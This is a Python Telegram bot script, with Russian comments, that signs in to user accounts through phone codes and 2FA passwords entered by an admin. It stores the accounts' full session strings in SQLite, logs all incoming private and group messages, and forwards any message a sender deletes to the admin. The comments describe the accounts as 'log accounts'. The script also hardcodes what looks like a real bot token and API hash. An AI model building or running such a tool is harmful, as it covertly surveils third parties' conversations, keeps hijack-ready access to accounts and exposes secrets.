import asyncio
import logging
import sqlite3
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# --- ТВОИ ДАННЫЕ ВШИТЫ НАПРЯМУЮ ---
BOT_TOKEN = "8899789712:AAEnm0ZRdyXPpRZ4_ZsAdFDx4-uq08AVyus"
ADMIN_ID = 8669477816

API_ID = 39188918
API_HASH = "41aaeaa0c6f9a61c0504395ccf5f3b3c"

# --- НАСТРОЙКА БАЗЫ ДАННЫХ SQLITE ---
logging.basicConfig(level=logging.INFO)
db = sqlite3.connect("bot_data.db", check_same_thread=False)
cursor = db.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (phone TEXT PRIMARY KEY, session_str TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS messages (acc_phone TEXT, msg_id INTEGER, chat_id INTEGER, sender_name TEXT, text TEXT, PRIMARY KEY (acc_phone, msg_id, chat_id))''')
db.commit()

bot = TelegramClient('main_bot_session', API_ID, API_HASH)

user_steps = {}  
active_clients = {}  

# --- ЛОГИКА СЛЕЖКИ ЗА УДАЛЕНИЯМИ ---

def register_userbot_handlers(client, phone):
    @client.on(events.NewMessage(incoming=True))
    async def on_new_message(event):
        if not (event.is_private or event.is_group):
            return
        if not event.text:
            return
        sender = await event.get_sender()
        sender_name = f"@{sender.username}" if sender and getattr(sender, 'username', None) else f"{getattr(sender, 'first_name', '')} {getattr(sender, 'last_name', '')}".strip()
        if not sender_name:
            sender_name = f"ID: {event.sender_id}"
        cursor.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?, ?, ?)", (phone, event.id, event.chat_id, sender_name, event.text))
        db.commit()

    @client.on(events.MessageDeleted())
    async def on_message_deleted(event):
        for msg_id in event.deleted_ids:
            cursor.execute("SELECT sender_name, text FROM messages WHERE acc_phone = ? AND msg_id = ?", (phone, msg_id))
            res = cursor.fetchone()
            if res:
                sender_name, text = res
                try:
                    chat = await client.get_entity(event.original_update.channel_id if hasattr(event.original_update, 'channel_id') else event.chat_id)
                    chat_title = getattr(chat, 'title', 'Личный чат')
                except:
                    chat_title = "Личный чат"

                report = (
                    f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ!</b>\n\n"
                    f"📱 <b>Лог аккаунта:</b> {phone}\n"
                    f"👥 <b>Где:</b> {chat_title}\n"
                    f"👤 <b>От кого:</b> {sender_name}\n"
                    f"📝 <b>Текст:</b> {text}"
                )
                await bot.send_message(ADMIN_ID, report, parse_mode='html')
                cursor.execute("DELETE FROM messages WHERE acc_phone = ? AND msg_id = ?", (phone, msg_id))
                db.commit()

async def start_all_saved_accounts():
    cursor.execute("SELECT phone, session_str FROM sessions")
    rows = cursor.fetchall()
    for phone, session_str in rows:
        try:
            cl = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await cl.connect()
            if await cl.is_user_authorized():
                active_clients[phone] = cl
                register_userbot_handlers(cl, phone)
                logging.info(f"Аккаунт {phone} успешно подключен.")
            else:
                logging.warning(f"Сессия {phone} недействительна.")
        except Exception as e:
            logging.error(f"Не удалось запустить аккаунт {phone}: {e}")

# --- ИНТЕРФЕЙС И КНОПКИ ---

@bot.on(events.NewMessage(pattern='/start', from_users=ADMIN_ID))
async def send_welcome(event):
    buttons = [
        [Button.inline("➕ Добавить аккаунт", b"add_acc")],
        [Button.inline("📱 Мои аккаунты", b"list_acc")]
    ]
    await event.respond("👋 Привет! Я твой менеджер аккаунтов-логов на Render.\n\nЖми кнопки ниже:", buttons=buttons)

@bot.on(events.CallbackQuery())
async def callback_handler(event):
    if event.sender_id != ADMIN_ID:
        return
    data = event.data
    if data == b"add_acc":
        user_steps[ADMIN_ID] = {"step": "phone"}
        await event.respond("📱 Введи номер телефона в формате `+79991234567`:")
    elif data == b"list_acc":
        cursor.execute("SELECT phone FROM sessions")
        accounts = cursor.fetchall()
        if not accounts:
            await event.respond("Список аккаунтов пуст.")
        else:
            text = "🟩 <b>Подключенные аккаунты:</b>\n\n" + "\n".join([f"• <code>{acc}</code>" for acc in accounts])
            await event.respond(text, parse_mode='html')

@bot.on(events.NewMessage(from_users=ADMIN_ID))
async def process_auth(event):
    if ADMIN_ID not in user_steps:
        return
    state = user_steps[ADMIN_ID]
    step = state.get("step")
    
    if step == "phone":
        phone = event.text.strip().replace(" ", "")
        state["phone"] = phone
        cl = TelegramClient(StringSession(), API_ID, API_HASH)
        await cl.connect()
        state["client"] = cl
        try:
            send_code_res = await cl.send_code_request(phone)
            state["phone_code_hash"] = send_code_res.phone_code_hash
            state["step"] = "code"
            await event.respond("📩 Отправил код. Введи его сюда:")
        except Exception as e:
            await event.respond(f"❌ Ошибка кода: {e}\nНачни заново через /start")
            user_steps.pop(ADMIN_ID, None)

    elif step == "code":
        code = event.text.strip()
        cl = state["client"]
        phone = state["phone"]
        phone_code_hash = state["phone_code_hash"]
        try:
            await event.delete()
        except:
            pass
        try:
            await cl.sign_in(phone, code, phone_code_hash=phone_code_hash)
            await save_and_start_session(event, cl, phone)
        except SessionPasswordNeededError:
            state["step"] = "password"
            await event.respond("🔐 Введи двухфакторный пароль (2FA):")
        except Exception as e:
            await event.respond(f"❌ Ошибка кода: {e}\nСброс через /start")
            user_steps.pop(ADMIN_ID, None)

    elif step == "password":
        password = event.text.strip()
        cl = state["client"]
        phone = state["phone"]
        try:
            await event.delete()
        except:
            pass
        try:
            await cl.sign_in(password=password)
            await save_and_start_session(event, cl, phone)
        except Exception as e:
            await event.respond(f"❌ Неверный пароль: {e}\nСброс через /start")
            user_steps.pop(ADMIN_ID, None)

async def save_and_start_session(event, cl, phone):
    session_str = cl.session.save()
    cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?)", (phone, session_str))
    db.commit()
    active_clients[phone] = cl
    register_userbot_handlers(cl, phone)
    await event.respond(f"✅ <b>Аккаунт {phone} успешно запущен!</b>", parse_mode='html')
    user_steps.pop(ADMIN_ID, None)

# --- ГЛАВНЫЙ ЗАПУСК СИСТЕМЫ ---
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    await start_all_saved_accounts()
    print("🤖 СИСТЕМА УСПЕШНО ЗАПУЩЕНА НА RENDER!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
